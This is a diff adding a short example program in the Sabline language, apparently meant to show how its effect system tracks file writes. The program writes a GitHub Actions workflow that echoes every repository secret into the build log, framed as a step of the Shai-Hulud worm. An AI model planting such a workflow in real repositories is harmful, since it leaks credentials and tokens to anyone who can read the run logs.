@@ -1,0 +1,11 @@
+// The worm's second move: leave a GitHub Actions workflow behind that
+// prints the repository's secrets on the next run. In Sabline that is a
+// write, and a write goes where the budget says.
+
+fn main() uses io, fs {
+    print("adding a workflow")
+    write_file(".github/workflows/shai-hulud-workflow.yml",
+    "on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
+    + "    steps:\n      - run: echo ${{ toJSON(secrets) }}\n")
+    print("added")
+}
